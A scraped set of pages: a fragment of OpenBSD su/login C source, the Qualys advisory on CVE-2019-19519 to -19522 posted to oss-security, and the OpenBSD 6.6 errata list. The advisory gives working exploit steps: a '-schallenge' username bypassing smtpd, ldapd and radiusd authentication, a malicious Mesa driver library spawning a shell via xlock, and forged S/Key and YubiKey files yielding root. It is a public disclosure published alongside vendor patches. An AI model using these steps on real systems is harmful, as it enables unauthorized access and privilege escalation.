 /\* \* Let the authentication program know whether they are \* in group wheel or not (if trying to become super user) \*/ if (pwd != NULL && pwd->pw\_uid == 0 && (gr = getgrgid(0)) != NULL && gr->gr\_mem != NULL && \*(gr->gr\_mem) != NULL) { for (g = gr->gr\_mem; \*g; ++g) { if (strcmp(from, \*g) == 0) { auth\_setoption(as, "wheel", "yes"); break; } } if (!\*g) auth\_setoption(as, "wheel", "no"); }
 auth\_verify(as, style, NULL, lc->lc\_class, (char \*)NULL); authok = auth\_getstate(as); if ((authok & AUTH\_ALLOW) == 0) { if ((cp = auth\_getvalue(as, "errormsg")) != NULL) fprintf(stderr, "%s\n", cp); return(1); } return(0);}
intchshell(const char \*sh){ char \*cp; int found = 0;
 setusershell(); while ((cp = getusershell()) != NULL) { if (strcmp(cp, sh) == 0) { found = 1; break; } } endusershell(); return (found);}
char \*ontty(void){ static char buf[PATH\_MAX + 4]; char \*p;
 buf[0] = 0; if ((p = ttyname(STDERR\_FILENO))) snprintf(buf, sizeof(buf), " on %s", p); return (buf);}
/\* \* Allow for a '.' and 16 characters for any instance as well as \* space for a ':' and 16 characters defining the authentication type. \*/#define NBUFSIZ (UT\_NAMESIZE + 1 + 16 + 1 + 16)
char \*getloginname(void){ static char nbuf[NBUFSIZ], \*p; int ch;
 for (;;) { printf("login: "); for (p = nbuf; (ch = getchar()) != '\n'; ) { if (ch == EOF) return (NULL); if (p < nbuf + (NBUFSIZ - 1)) \*p++ = ch; } if (p > nbuf) { if (nbuf[0] == '-') { fprintf(stderr, "login names may not start with '-'.\n"); } else { \*p = '\0'; break; } } } return (nbuf);}
voidusage(void){ extern char \*\_\_progname;
 fprintf(stderr, "usage: %s [-fKLlm] [-a auth-type] [-c login-class] " "[-s login-shell]\n" "%-\*s[login [shell arguments]]\n", \_\_progname, (int)strlen(\_\_progname) + 8, ""); exit(1);}
voidauth\_err(auth\_session\_t \*as, int eval, const char \*fmt, ...){ va\_list ap;
 va\_start(ap, fmt); vwarn(fmt, ap); va\_end(ap); auth\_close(as); exit(eval);}
voidauth\_errx(auth\_session\_t \*as, int eval, const char \*fmt, ...){ va\_list ap;
 va\_start(ap, fmt); vwarnx(fmt, ap); va\_end(ap); auth\_close(as); exit(eval);}

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from www.openwall.com_30d8335d_20250121_002238.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](4) [[next>]](6) [[thread-next>]](6) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <20191204204020.GB7012@localhost.localdomain>
Date: Wed, 4 Dec 2019 20:49:22 +0000
From: Qualys Security Advisory <qsa@...lys.com>
To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
Subject: Authentication vulnerabilities in OpenBSD

Qualys Security Advisory

Authentication vulnerabilities in OpenBSD

==============================================================================
Contents
==============================================================================

1. CVE-2019-19521: Authentication bypass
   1.1. Analysis
   1.2. Case study: smtpd
   1.3. Case study: ldapd
   1.4. Case study: radiusd
   1.5. Case study: sshd
   1.6. Case study: su
2. CVE-2019-19520: Local privilege escalation via xlock
3. CVE-2019-19522: Local privilege escalation via S/Key and YubiKey
4. CVE-2019-19519: Local privilege escalation via su
5. Acknowledgments

==============================================================================
1. CVE-2019-19521: Authentication bypass
==============================================================================

We discovered an authentication-bypass vulnerability in OpenBSD's
authentication system: this vulnerability is remotely exploitable in
smtpd, ldapd, and radiusd, but its real-world impact should be studied
on a case-by-case basis. For example, sshd is not exploitable thanks to
its defense-in-depth mechanisms.

==============================================================================
1.1. Analysis
==============================================================================

From the manual page of login.conf:

------------------------------------------------------------------------------
     OpenBSD uses BSD Authentication, which is made up of a variety of
     authentication styles.  The authentication styles currently provided are:
     ...
     passwd     Request a password and check it against the password in the
                master.passwd file.  See login_passwd(8).
     ...
     skey       Send a challenge and request a response, checking it with
                S/Key (tm) authentication.  See login_skey(8).
     ...
     yubikey    Authenticate using a Yubico YubiKey token.  See
                login_yubikey(8).
     ...
     For any given style, the program /usr/libexec/auth/login_style is used to
     perform the authentication.  The synopsis of this program is:

     /usr/libexec/auth/login_style [-v name=value] [-s service] username class
------------------------------------------------------------------------------

This is the first piece of the puzzle: if an attacker specifies a
username of the form "-option", they can influence the behavior of the
authentication program in unexpected ways.

From the manual page of login_passwd:

------------------------------------------------------------------------------
     login_passwd [-s service] [-v wheel=yes|no] [-v lastchance=yes|no] user
                  [class]
     ...
     The service argument specifies which protocol to use with the invoking
     program.  The allowed protocols are login, challenge, and response.  (The
     challenge protocol is silently ignored but will report success as passwd-
     style authentication is not challenge-response based).
------------------------------------------------------------------------------

This is the second piece of the puzzle: if an attacker specifies the
username "-schallenge" (or "-schallenge:passwd" to force a passwd-style
authentication), then the authentication is automatically successful and
therefore bypassed.

==============================================================================
1.2. Case study: smtpd
==============================================================================

To demonstrate how smtpd's authentication can be bypassed, we follow the
instructions from the manual page of smtpd.conf:

------------------------------------------------------------------------------
     In this second example, the aim is to permit mail delivery and relaying
     only for users that can authenticate (using their normal login
     credentials).
           ...
           listen on egress tls pki mail.example.com auth
           ...
           match auth from any for any action "outbound"
------------------------------------------------------------------------------

and we restart smtpd. Then, with our remote-attacker hat on:

------------------------------------------------------------------------------
$ printf '\0-schallenge\0whatever' | openssl base64
AC1zY2hhbGxlbmdlAHdoYXRldmVy

$ openssl s_client -connect 192.168.56.121:25 -starttls smtp
...
EHLO client.example.com
...
AUTH PLAIN AC1zY2hhbGxlbmdlAHdoYXRldmVy
235 2.0.0 Authentication succeeded
------------------------------------------------------------------------------

==============================================================================
1.3. Case study: ldapd
==============================================================================

From the manual page of ldapd:

------------------------------------------------------------------------------
     ldapd can authenticate users via simple binds or SASL with the PLAIN
     mechanism.
     ...
     When using SASL binds, the authentication ID should be a valid username
     for BSD Authentication.

     For plain text passwords to be accepted, the connection must be
     considered secure, either by using an encrypted connection, or by using
     the secure keyword in the configuration file.
------------------------------------------------------------------------------

Over such a secure connection, a remote attacker can bypass ldapd's SASL
authentication:

------------------------------------------------------------------------------
$ ldapsearch -H ldap://192.168.56.121 -O none -U invaliduser -w whatever
SASL/PLAIN authentication started
ldap_sasl_interactive_bind_s: Invalid credentials (49)

$ ldapsearch -H ldap://192.168.56.121 -O none -U -schallenge -w whatever
SASL/PLAIN authentication started
SASL username: -schallenge
...
# numResponses: 1
------------------------------------------------------------------------------

==============================================================================
1.4. Case study: radiusd
==============================================================================

To show how radiusd's authentication can be bypassed, we adapt the
configuration example from the manual page of radiusd.conf:

------------------------------------------------------------------------------
           module load "bsdauth" "/usr/libexec/radiusd/radiusd_bsdauth"
           ...
           authenticate * {
                   authenticate-by "bsdauth"
           }
------------------------------------------------------------------------------

and we send the following (successful) authentication request:

------------------------------------------------------------------------------
$ radiusctl test 192.168.56.121 secret -schallenge password whatever
    ...
    Reply-Message             = "Authentication succeeded"
------------------------------------------------------------------------------

If we further modify radiusd's configuration to restrict access to the
members of the group "operator":

------------------------------------------------------------------------------
           module set "bsdauth"  "restrict-group" "operator"
------------------------------------------------------------------------------

and send our authentication request, then radiusd_bsdauth crashes
because of a NULL-pointer dereference (because getpwnam("-schallenge")
returns NULL):

------------------------------------------------------------------------------
 80 int
 81 main(int argc, char *argv[])
 82 {
...
192                                 pw = getpwnam(user);
...
197                                 if (gr->gr_gid == pw->pw_gid) {
------------------------------------------------------------------------------

==============================================================================
1.5. Case study: sshd
==============================================================================

Even if an attacker were able to bypass sshd's authentication with an
invalid user such as "-schallenge", sshd would eventually reject it:

------------------------------------------------------------------------------
 225 void
 226 monitor_child_preauth(struct ssh *ssh, struct monitor *pmonitor)
 227 {
 ...
 229         int authenticated = 0, partial = 0;
 ...
 249         while (!authenticated) {
 ...
 288         }
 289
 290         if (!authctxt->valid)
 291                 fatal("%s: authenticated invalid user", __func__);
------------------------------------------------------------------------------

Nevertheless, we can use sshd to remotely test whether an OpenBSD system
is vulnerable to CVE-2019-19521 or not:

------------------------------------------------------------------------------
$ ssh -v -F /dev/null -o PreferredAuthentications=keyboard-interactive \
      -o KbdInteractiveDevices=bsdauth -l -sresponse:passwd 192.168.56.121
...
debug1: Next authentication method: keyboard-interactive
------------------------------------------------------------------------------

It is vulnerable if the connection hangs, because sshd waits for
login_passwd to send a challenge, while login_passwd waits for sshd to
send a response (because login_passwd interprets the username
"-sresponse" as an option).

==============================================================================
1.6. Case study: su
==============================================================================

A local attacker can bypass su's authentication for the invalid user
"-schallenge", but su eventually crashes because of a NULL-pointer
dereference (because getpwnam_r("-schallenge", ...) returns NULL):

------------------------------------------------------------------------------
$ su -L -- -schallenge
Segmentation fault
------------------------------------------------------------------------------

==============================================================================
2. CVE-2019-19520: Local privilege escalation via xlock
==============================================================================

On OpenBSD, /usr/X11R6/bin/xlock is installed by default and is
set-group-ID "auth", not set-user-ID; the following check is therefore
incomplete and should use issetugid() instead:

------------------------------------------------------------------------------
101 _X_HIDDEN void *
102 driOpenDriver(const char *driverName)
103 {
...
113    if (geteuid() == getuid()) {
114       /* don't allow setuid apps to use LIBGL_DRIVERS_PATH */
115       libPaths = getenv("LIBGL_DRIVERS_PATH");
------------------------------------------------------------------------------

A local attacker can exploit this vulnerability and dlopen() their own
driver to obtain the privileges of the group "auth":

------------------------------------------------------------------------------
$ id
uid=32767(nobody) gid=32767(nobody) groups=32767(nobody)

$ cd /tmp

$ cat > swrast_dri.c << "EOF"
#include <paths.h>
#include <sys/types.h>
#include <unistd.h>

static void __attribute__ ((constructor)) _init (void) {
    gid_t rgid, egid, sgid;
    if (getresgid(&rgid, &egid, &sgid) != 0) _exit(__LINE__);
    if (setresgid(sgid, sgid, sgid) != 0) _exit(__LINE__);

    char * const argv[] = { _PATH_KSHELL, NULL };
    execve(argv[0], argv, NULL);
    _exit(__LINE__);
}
EOF

$ gcc -fpic -shared -s -o swrast_dri.so swrast_dri.c

$ env -i /usr/X11R6/bin/Xvfb :66 -cc 0 &
[1] 2706

$ env -i LIBGL_DRIVERS_PATH=. /usr/X11R6/bin/xlock -display :66

$ id
uid=32767(nobody) gid=11(auth) groups=32767(nobody)
------------------------------------------------------------------------------

==============================================================================
3. CVE-2019-19522: Local privilege escalation via S/Key and YubiKey
==============================================================================

If the S/Key or YubiKey authentication type is enabled (they are both
installed by default but disabled), then a local attacker can exploit
the privileges of the group "auth" to obtain the full privileges of the
user "root" (because login_skey and login_yubikey do not verify that the
files in /etc/skey and /var/db/yubikey belong to the correct user, and
these directories are both writable by the group "auth").

(Note: to obtain the privileges of the group "auth", a local attacker
can first exploit CVE-2019-19520 in xlock.)

If S/Key is enabled (via skeyinit -E), a local attacker with "auth"
privileges can add an S/Key entry (a file in /etc/skey) for the user
"root" (if this file already exists, the attacker cannot simply remove
or rename it, because /etc/skey is sticky; a simple workaround exists,
and is left as an exercise for the interested reader):

------------------------------------------------------------------------------
$ id
uid=32767(nobody) gid=11(auth) groups=32767(nobody)

$ echo 'root md5 0100 obsd91335 8b6d96e0ef1b1c21' > /etc/skey/root

$ chmod 0600 /etc/skey/root

$ env -i TERM=vt220 su -l -a skey
otp-md5 99 obsd91335
S/Key Password: EGG LARD GROW HOG DRAG LAIN

# id
uid=0(root) gid=0(wheel) ...
------------------------------------------------------------------------------

If YubiKey is enabled (via login.conf), a local attacker with "auth"
privileges can add a YubiKey entry (two files in /var/db/yubikey) for
the user "root" (if these files already exist, the attacker can simply
remove or rename them, because /var/db/yubikey is not sticky):

------------------------------------------------------------------------------
$ id
uid=32767(nobody) gid=11(auth) groups=32767(nobody)

$ echo 32d32ddfb7d5 > /var/db/yubikey/root.uid

$ echo 554d5eedfd75fb96cc74d52609505216 > /var/db/yubikey/root.key

$ env -i TERM=vt220 su -l -a yubikey
Password: krkhgtuhdnjclrikikklulkldlutreul

# id
uid=0(root) gid=0(wheel) ...
------------------------------------------------------------------------------

==============================================================================
4. CVE-2019-19519: Local privilege escalation via su
==============================================================================

A local attacker can exploit su's -L option ("Loop until a correct
username and password combination is entered") to log in as themselves
but with another user's login class (with the exception of root's login
class if the attacker is not in the group "wheel"), because the class
variable is set once and never reset:

------------------------------------------------------------------------------
 60 int
 61 main(int argc, char **argv)
 62 {
...
174         for (;;) {
...
210                 if (!class && pwd && pwd->pw_class && pwd->pw_class[0] != '\0')
211                         class = strdup(pwd->pw_class);
------------------------------------------------------------------------------

In the following example, Jane (who is a member of the group "wheel")
logs in with root's login class ("daemon"), thereby increasing her
resource limits:

------------------------------------------------------------------------------
$ id
uid=1000(jane) gid=1000(jane) groups=1000(jane), 0(wheel)

$ ulimit -H -a
...
processes            512

$ su -l -L
login: root
Password:
Login incorrect
login: jane
Password:

$ id
uid=1000(jane) gid=1000(jane) groups=1000(jane), 0(wheel)

$ ulimit -H -a
...
processes            1310
------------------------------------------------------------------------------

In the following example, John (who is not a member of the group
"wheel") logs in with _pbuild's login class ("pbuild"), thereby
increasing his resource limits:

------------------------------------------------------------------------------
$ id
uid=1001(john) gid=1001(john) groups=1001(john)

$ ulimit -H -a
...
data(kbytes)         786432
...
processes            256

$ su -l -L
login: _pbuild
Password:
Login incorrect
login: john
Password:

$ id
uid=1001(john) gid=1001(john) groups=1001(john)

$ ulimit -H -a
...
data(kbytes)         33554432
...
processes            1024
------------------------------------------------------------------------------

==============================================================================
5. Acknowledgments
==============================================================================

We thank Theo de Raadt and the OpenBSD developers for their incredibly
quick response: they published patches for these vulnerabilities less
than 40 hours after our initial contact. We also thank MITRE's CVE
Assignment Team.

[<https://d1dejaj6dcqv24.cloudfront.net/asset/image/email-banner-384-2x.png>]<<https://www.qualys.com/email-banner>>

This message may contain confidential and privileged information. If it has been sent to you in error, please reply to advise the sender of the error and then immediately delete it. If you are not the intended recipient, do not read, copy, disclose or otherwise use this message. The sender disclaims any liability for such unauthorized use. NOTE that all incoming emails sent to Qualys email accounts will be archived and may be scanned by us and/or by external service providers to detect and prevent threats to our systems, investigate illegal or inappropriate behavior, and/or eliminate unsolicited promotional emails (“spam”). If you have any concerns about this process, please contact us.

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from www.openbsd.org_224d38a5_20250121_002241.html ===


OpenBSD 6.6 Errata

## [*Open***BSD**](index.html) 6.6 Errata

---

For errata on a certain release, click below:

[2.0](errata20.html),
[2.1](errata21.html),
[2.2](errata22.html),
[2.3](errata23.html),
[2.4](errata24.html),
[2.5](errata25.html),
[2.6](errata26.html),
[2.7](errata27.html),
[2.8](errata28.html),
[2.9](errata29.html),
[3.0](errata30.html),
[3.1](errata31.html),
[3.2](errata32.html),
[3.3](errata33.html),
[3.4](errata34.html),
[3.5](errata35.html),

[3.6](errata36.html),
[3.7](errata37.html),
[3.8](errata38.html),
[3.9](errata39.html),
[4.0](errata40.html),
[4.1](errata41.html),
[4.2](errata42.html),
[4.3](errata43.html),
[4.4](errata44.html),
[4.5](errata45.html),
[4.6](errata46.html),
[4.7](errata47.html),
[4.8](errata48.html),
[4.9](errata49.html),
[5.0](errata50.html),
[5.1](errata51.html),

[5.2](errata52.html),
[5.3](errata53.html),
[5.4](errata54.html),
[5.5](errata55.html),
[5.6](errata56.html),
[5.7](errata57.html),
[5.8](errata58.html),
[5.9](errata59.html),
[6.0](errata60.html),
[6.1](errata61.html),
[6.2](errata62.html),
[6.3](errata63.html),
[6.4](errata64.html),
[6.5](errata65.html),
[6.7](errata67.html),
[6.8](errata68.html),

[6.9](errata69.html),
[7.0](errata70.html),
[7.1](errata71.html),
[7.2](errata72.html),
[7.3](errata73.html),
[7.4](errata74.html),
[7.5](errata75.html),
[7.6](errata76.html).

---

Patches for the OpenBSD base system are distributed as unified diffs.
Each patch is cryptographically signed with the
[signify(1)](https://man.openbsd.org/OpenBSD-6.6/signify.1) tool and contains
usage instructions.
All the following patches are also available in one
[tar.gz file](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6.tar.gz)
for convenience.

Alternatively, the [syspatch(8)](https://man.openbsd.org/syspatch)
utility can be used to apply binary updates on the following architectures:
amd64, i386, arm64.

Patches for supported releases are also incorporated into the
[-stable branch](stable.html).

---

* **001: RELIABILITY FIX: October 28, 2019**
    *All architectures*

  bpf(4) has a race condition during device removal.

  [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/001_bpf.patch.sig)

  * **002: RELIABILITY FIX: October 28, 2019**
      *All architectures*

    Various third party applications may crash due to symbol collision.

    [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/002_ber.patch.sig)

    * **003: RELIABILITY FIX: October 31, 2019**
        *All architectures*

      bgpd(8) can crash on nexthop changes or during startup in certain
      configurations.

      [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/003_bgpd.patch.sig)

      * **004: RELIABILITY FIX: November 16, 2019**
          *All architectures*

        The kernel could crash due to a NULL pointer dereference in net80211.

        [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/004_net80211.patch.sig)

        * **005: RELIABILITY FIX: November 16, 2019**
            *All architectures*

          A new kernel may require newer firmware images when using sysupgrade.

          [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/005_sysupgrade.patch.sig)

          * **006: SECURITY FIX: November 16, 2019**
              *All architectures*

            A regular user could change some network interface parameters due
            to missing checks in the ioctl(2) system call.

            [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/006_ifioctl.patch.sig)

            * **007: SECURITY FIX: November 22, 2019**
                *i386 and amd64*

              A local user could cause the system to hang by reading specific
              registers when Intel Gen8/Gen9 graphics hardware is in a low power state.
              A local user could perform writes to memory that should be blocked with
              Intel Gen9 graphics hardware.

              [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/007_inteldrm.patch.sig)

              * **008: SECURITY FIX: November 22, 2019**
                  *All architectures*

                Shared memory regions used by some Mesa drivers had permissions which
                allowed others to access that memory.

                [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/008_mesa.patch.sig)

                * **009: SECURITY FIX: December 4, 2019**
                    *All architectures*

                  Environment-provided paths are used for dlopen() in mesa, resulting in
                  escalation to the auth group in xlock(1).

                  [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/009_mesaxlock.patch.sig)

                  * **010: SECURITY FIX: December 4, 2019**
                      *All architectures*

                    libc's authentication layer performed insufficient username validation.

                    [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/010_libcauth.patch.sig)

                    * **011: SECURITY FIX: December 4, 2019**
                        *All architectures*

                      xenodm uses the libc authentication layer incorrectly.

                      [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/011_xenodm.patch.sig)

                      * **012: SECURITY FIX: December 8, 2019**
                          *All architectures*

                        A user can log in with a different user's login class.

                        [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/012_suauth.patch.sig)

                        * **013: SECURITY FIX: December 11, 2019**
                            *All architectures*

                          ld.so may fail to remove the LD\_LIBRARY\_PATH environment variable for
                          set-user-ID and set-group-ID executables in low memory conditions.

                          [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/013_ldso.patch.sig)

                          * **014: SECURITY FIX: December 18, 2019**
                              *arm64*

                            ARM64 CPUs speculatively execute instructions after ERET.

                            [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/014_eret.patch.sig)

                            * **015: SECURITY FIX: December 20, 2019**
                                *All architectures*

                              ftp(1) will follow remote redirects to local files.

                              [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/015_ftp.patch.sig)

                              * **016: SECURITY FIX: December 20, 2019**
                                  *All architectures*

                                ripd(8) fails to validate authentication lengths.

                                [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/016_ripd.patch.sig)

                                * **017: SECURITY FIX: January 17, 2020**
                                    *i386 and amd64*

                                  Execution Unit state was not cleared on context switch with Intel Gen9
                                  graphics hardware.

                                  [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/017_inteldrmctx.patch.sig)

                                  * **018: RELIABILITY FIX: January 30, 2020**
                                      *All architectures*

                                    smtpd can crash on opportunistic TLS downgrade, causing a denial of service.

                                    [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/018_smtpd_tls.patch.sig)

                                    * **019: SECURITY FIX: January 30, 2020**
                                        *All architectures*

                                      An incorrect check allows an attacker to trick mbox delivery into executing
                                      arbitrary commands as root and lmtp delivery into executing arbitrary commands
                                      as an unprivileged user.

                                      [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/019_smtpd_exec.patch.sig)

                                      * **020: SECURITY FIX: February 17, 2020**
                                          *amd64*

                                        A missing range check in the vmm pvclock allows a guest to write
                                        to host memory.

                                        [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/020_vmm_pvclock.patch.sig)

                                        * **021: SECURITY FIX: February 24, 2020**
                                            *All architectures*

                                          An out of bounds read in smtpd allows an attacker to inject arbitrary
                                          commands into the envelope file which are then executed as root.
                                          Separately, missing privilege revocation in smtpctl allows arbitrary
                                          commands to be run with the \_smtpq group.

                                          [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/021_smtpd_envelope.patch.sig)

                                          * **022: RELIABILITY FIX: March 10, 2020**
                                              *All architectures*

                                            Missing input validation in sysctl(2) can be used to crash the kernel.

                                            [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/022_sysctl.patch.sig)

                                            * **023: RELIABILITY FIX: March 13, 2020**
                                                *All architectures*

                                              Local outbound UDP broadcast or multicast packets sent by a spliced
                                              socket can crash the kernel.

                                              [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/023_sosplice.patch.sig)

                                              * **024: SECURITY FIX: April 7, 2020**
                                                  *All architectures*

                                                dhcpd could reference freed memory after releasing a lease with an
                                                unusually long uid.

                                                [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/024_dhcpd.patch.sig)

                                                * **025: SECURITY FIX: April 19, 2020**
                                                    *i386, amd64, arm64, loongson, macppc, sparc64*

                                                  There was an incorrect test for root in the DRM Linux compatibility code.

                                                  [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/025_drm.patch.sig)

                                                  * **026: RELIABILITY FIX: May 10, 2020**
                                                      *All architectures*

                                                    ospfd could generate corrupt OSPF Router (Type 1) LSAs in certain situations.

                                                    [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/026_ospfd_lsa.patch.sig)

                                                    * **027: SECURITY FIX: May 13, 2020**
                                                        *All architectures*

                                                      An out-of-bounds index access in wscons(4) can cause a kernel crash.

                                                      [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/027_wscons.patch.sig)

                                                      * **028: SECURITY FIX: May 22, 2020**
                                                          *All architectures*

                                                        Specially crafted queries may crash unbound and unwind.
                                                        Both can be tricked into amplifying an incoming query.

                                                        [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/028_unbound.patch.sig)

                                                        * **029: SECURITY FIX: June 1, 2020**
                                                            *All architectures*

                                                          Several problems in Perl's regular expression compiler could lead to
                                                          corruption of the intermediate language state of a compiled regular
                                                          expression.

                                                          [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/029_perl.patch.sig)

                                                          * **030: SECURITY FIX: June 5, 2020**
                                                              *All architectures*

                                                            Malicious HID descriptors could be misparsed.

                                                            [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/030_hid.patch.sig)

                                                            * **031: RELIABILITY FIX: June 8, 2020**
                                                                *All architectures*

                                                              libc's resolver could get into a corrupted state.

                                                              [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/031_asr.patch.sig)

                                                              * **032: RELIABILITY FIX: June 11, 2020**
                                                                  *All architectures*

                                                                libcrypto may fail to build a valid certificate chain due to
                                                                expired untrusted issuer certificates.

                                                                [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/032_x509.patch.sig)

                                                                * **033: SECURITY FIX: July 9, 2020**
                                                                    *All architectures*

                                                                  shmget IPC\_STAT leaked some kernel data.

                                                                  [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/033_shmget.patch.sig)

                                                                  * **034: RELIABILITY FIX: July 16, 2020**
                                                                      *All architectures*

                                                                    tty subsystem abuse can impact performance badly.

                                                                    [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/034_tty.patch.sig)

                                                                    * **035: RELIABILITY FIX: July 22, 2020**
                                                                        *All architectures*

                                                                      Only pty devices need reprint delays.

                                                                      [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/035_tty.patch.sig)

                                                                      * **036: SECURITY FIX: July 27, 2020**
                                                                          *All architectures*

                                                                        In iked, incorrect use of EVP\_PKEY\_cmp allows an authentication bypass.

                                                                        [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/036_iked.patch.sig)

                                                                        * **037: SECURITY FIX: July 31, 2020**
                                                                            *All architectures*

                                                                          Malformed messages can cause heap corruption in the X Input Method
                                                                          client implementation in libX11.

                                                                          [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/037_ximcp.patch.sig)

                                                                          * **038: SECURITY FIX: July 31, 2020**
                                                                              *All architectures*

                                                                            Pixmaps inside the xserver were an info leak.

                                                                            [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/038_dix.patch.sig)

                                                                            * **039: RELIABILITY FIX: August 7, 2020**
                                                                                *All architectures*

                                                                              The recent security errata 037 broke X11 input methods.

                                                                              [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/039_ximcp.patch.sig)

                                                                              * **040: SECURITY FIX: August 25, 2020**
                                                                                  *All architectures*

                                                                                An integer overflow in libX11 could lead to a double free.
                                                                                Additionally fix a regression in ximcp.

                                                                                [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/040_xinitom.patch.sig)

                                                                                * **041: SECURITY FIX: August 25, 2020**
                                                                                    *All architectures*

                                                                                  Various X server extensions had deficient input validation.

                                                                                  [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/6.6/common/041_xserverlen.patch.sig)

                                                                                  * **042: SECURITY FIX: September 5, 2020**
                                                                                      *amd64, arm64*

